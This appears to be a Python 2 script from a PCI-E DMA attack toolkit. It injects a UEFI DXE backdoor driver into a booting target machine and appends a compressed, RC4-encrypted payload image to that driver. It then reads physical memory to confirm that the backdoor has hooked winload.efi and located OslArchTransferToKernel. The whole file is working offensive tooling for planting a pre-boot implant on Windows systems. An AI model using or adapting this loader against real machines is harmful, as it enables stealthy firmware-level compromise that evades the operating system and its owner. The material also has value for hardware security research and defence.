#!/usr/bin/env python

import sys, os, random
from struct import pack, unpack
from optparse import OptionParser

from pcie_lib import *
from uefi import *

# physical address of _BACKDOOR_INFO structure
BACKDOOR_INFO_ADDR = STATUS_ADDR - (8 * 3)

# debug messages buffer pointer address
OUTPUT_ADDR = BACKDOOR_INFO_ADDR - 8
OUTPUT_SIZE = PAGE_SIZE

# error codes
BACKDOOR_ERR_UNKNOWN        = -1    # unkown error
BACKDOOR_ERR_WINLOAD_IMAGE  = -2    # winload image not found
BACKDOOR_ERR_WINLOAD_SIGN_1 = -3    # winload!HvlpBelow1MbPage not found
BACKDOOR_ERR_WINLOAD_SIGN_2 = -4    # winload!OslArchTransferToKernel() not found
BACKDOOR_ERR_WINLOAD_HV     = -5    # Hyper-V is enabled

# payload DXE driver
DRIVER_PATH = os.path.join(os.path.dirname(os.path.realpath(__file__)), \
              'payloads/DmaBackdoorBoot/DmaBackdoorBoot_X64.efi')

PAYLOAD_KEY_LEN = 0x10

class RC4:

    def __init__(self, key):

        self.x = self.y = 0        
        self.s = range(256)

        j = 0

        # populate S-box
        for i in range(256):

            j = (j + self.s[i] + ord(key[i % len(key)])) % 256

            # swap
            self.s[i], self.s[j] = self.s[j], self.s[i]

    def crypt(self, data):

        ret = ''
    
        # encrypt/decrypt data
        for char in data:
        
            self.x = (self.x + 1) % 256
            self.y = (self.y + self.s[self.x]) % 256
            
            # swap
            self.s[self.x], self.s[self.y] = self.s[self.y], self.s[self.x]
            
            ret += chr(ord(char) ^ self.s[(self.s[self.x] + self.s[self.y]) % 256])

        return ret

def inject(driver = None, payload = None, test = False, method = None, system_table = None, prot_entry = None):

    driver = DRIVER_PATH if driver is None else driver
    method = DXE_INJECT_ST if method is None else method

    if not test:

        try:

            import pefile

        except ImportError:

            raise ImportError('pefile is not installed')

        try:

            import lznt1

        except ImportError:

            raise ImportError('lznt1 is not installed')

        # load DXE driver image
        pe = pefile.PE(driver)

        if payload is not None:

            with open(payload, 'rb') as fd:

                # read payload image data
                payload_data = fd.read()
                payload_data_len = len(payload_data)

            print('[+] %d bytes of payload image read' % payload_data_len)

            # compress payload image
            payload_data = lznt1.compress(payload_data)

            print('[+] %d bytes of payload image after the compression' % len(payload_data))

            # generate payload encryption key
            key = ''.join([chr(random.randrange(0x01, 0xff)) for i in range(0, PAYLOAD_KEY_LEN)])

            # prepare _PAYLOAD_HEADER structure
            payload_data = pack('I', payload_data_len) + key + RC4(key).crypt(payload_data)

            # write _BACKDOOR_PAYLOAD structure
            pe.DOS_HEADER.e_res = pack('II', os.path.getsize(driver), len(payload_data))

            # get DXE driver image data + payload
            data = pe.write() + payload_data

        else:

            # get DXE driver image data
            data = pe.write()

    else:

        # don't inject anything, just find needed structures
        data = None

    # inject DXE driver into the booting system
    dev = dxe_inject(method = method, payload_data = data, 
                     system_table = system_table, prot_entry = prot_entry)

    if test:

        return dev

    print('[+] DXE driver was planted, waiting for backdoor init...')    

    while True:

        # wait for DXE backdoor
        status = dev.mem_read_8(STATUS_ADDR)
        
        if status == 0:

            # not ready yet
            time.sleep(1)
            continue

        print('[+] DXE driver was executed, you can read its debug messages by running this program with --debug-output option')

        break

    print('[+] Waiting for backdoor load...')

    dev.mem_write_8(BACKDOOR_INFO_ADDR, 0)

    while True:

        # wait for hypervisor
        status, image_base, image_func = unpack('qQQ', dev.mem_read(BACKDOOR_INFO_ADDR, 8 * 3))

        if status == 0:

            # not ready yet
            time.sleep(1)
            continue

        if status == BACKDOOR_ERR_WINLOAD_IMAGE:

            print('ERROR: DXE driver is unable to locate winload.efi')
            break

        elif status == BACKDOOR_ERR_WINLOAD_SIGN_1:

            print('ERROR: DXE driver is unable to locate winload!HvlpBelow1MbPage')
            break

        elif status == BACKDOOR_ERR_WINLOAD_SIGN_2:

            print('ERROR: DXE driver is unable to locate winload!OslArchTransferToKernel()')
            break

        elif status == BACKDOOR_ERR_WINLOAD_HV:

            print('ERROR: Hyper-V is loaded, giving up')
            break

        elif status == BACKDOOR_ERR_UNKNOWN:

            print('ERROR: DXE driver returned unknown error')
            break

        print('[+] Winload image was loaded\n')
        print('              Image base: 0x%.8x' % image_base)
        print(' OslArchTransferToKernel: 0x%.8x\n' % image_func)

        print('[+] DONE')

        return dev

    # error ocurred
    dev.close()

    return None

def print_debug_output():

    # open device
    dev = TransactionLayer()    

    print('[+] PCI-E link with target is up')

    # read debug output address
    addr = dev.mem_read_8(OUTPUT_ADDR)

    print('[+] Debug output buffer address is 0x%x' % addr)

    # check for the sane address
    if addr > 0x1000 and addr < 0x100000000 and (addr & 0xfff) == 0:

        # read debug output
        data = dev.mem_read(addr, OUTPUT_SIZE)

        print('\n' + data.split('\0')[0])
        return 0

    else:

        print('[!] Invalid address')
        return -1   

def main():

    parser = OptionParser()    

    parser.add_option('-d', '--driver', dest = 'driver', default = None,
        help = 'DXE driver image path')

    parser.add_option('-p', '--payload', dest = 'payload', default = None,
        help = 'payload image path')

    parser.add_option('-s', '--system-table', dest = 'system_table', default = None,
        help = 'EFI_SYSTEM_TABLE address')    

    parser.add_option('-e', '--prot-entry', dest = 'prot_entry', default = None,
        help = 'PROTOCOL_ENTRY address')    

    parser.add_option('-t', '--test', dest = 'test', default = False, action = 'store_true',
        help = 'test run, don\'t execute an actual DXE driver')

    parser.add_option('--debug-output', dest = 'debug_output', default = False, action = 'store_true',
        help = 'read DXE driver debug output')

    parser.add_option('--inj-prot', dest = 'inj_prot', default = False, action = 'store_true',
        help = 'use DXE protocol hook injection method')

    # parse command line
    options, _ = parser.parse_args()

    options.system_table = None if options.system_table is None else int(options.system_table, 16)
    options.prot_entry = None if options.prot_entry is None else int(options.prot_entry, 16)         

    try:

        if options.debug_output:

            # read and print debug messages of DXE driver
            return print_debug_output()

        # perform the attack
        dev = inject(driver = options.driver, payload = options.payload, test = options.test, 
                     method = DXE_INJECT_PROT if options.inj_prot else DXE_INJECT_ST, 
                     system_table = options.system_table, prot_entry = options.prot_entry)

        if dev is not None:

            dev.close()
            return 0

    except AssertionError:

        raise

    except KeyboardInterrupt:

        print('\n')    

    except Exception, why:

        print('ERROR: %s' % str(why))

    return -1

if __name__ == '__main__':

    exit(main())

#
# EoF
#
